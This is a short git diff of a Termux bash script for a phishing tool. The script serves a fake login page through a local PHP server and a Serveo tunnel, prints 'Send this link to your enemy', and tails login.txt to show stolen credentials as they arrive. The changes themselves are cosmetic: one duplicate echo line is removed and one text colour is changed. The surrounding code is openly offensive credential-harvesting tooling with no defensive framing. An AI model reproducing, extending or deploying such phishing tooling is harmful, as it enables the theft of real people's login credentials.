@@ -24,7 +24,6 @@ pkg install php openssh git -y > /dev/null 2>&1
 start_localhost() {
     echo -e "${GRN}[+] Starting localhost server at http://127.0.0.1:8080 ...${NC}"
     php -S 127.0.0.1:8080 > /dev/null 2>&1 &
-    echo -e "${GRN}[!] Waiting for credentials... (Press CTRL + C to exit)${NC}"
 echo -e "${YEL}[!] Waiting for new credentials... (Press CTRL + C to exit)${NC}"
 tail -n 0 -f login.txt 2>/dev/null
 }
@@ -51,7 +50,7 @@ start_serveo() {
 #live credentials 
 
 echo -e "${GRN}[+] Phishing Page Live at: $SERVEO_URL${NC}"
-echo -e "${GRN}[@]Send this link to your enemy${NC}"
+echo -e "${CYAN}[@]Send this link to your enemy${NC}"
 echo -e "${YEL}[!] Waiting for new credentials... (Press CTRL + C to exit)${NC}"
 tail -n 0 -f login.txt 2>/dev/null
 }
